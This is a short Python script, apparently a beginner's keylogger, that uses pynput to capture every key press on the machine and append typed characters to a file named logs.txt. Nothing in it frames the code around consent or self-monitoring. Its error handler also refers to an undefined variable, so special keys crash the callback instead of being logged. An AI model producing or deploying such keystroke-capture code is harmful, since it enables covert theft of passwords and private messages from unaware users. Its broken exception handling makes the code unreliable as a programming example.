from pynput import keyboard


def key_pressed(key):
    print(str(key))


    with open("logs.txt","a") as logfile:
        try:
            typed = key.char
            logfile.write(typed)
        except:
            print(f"error occured{e}")   

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    listener.join()             




    


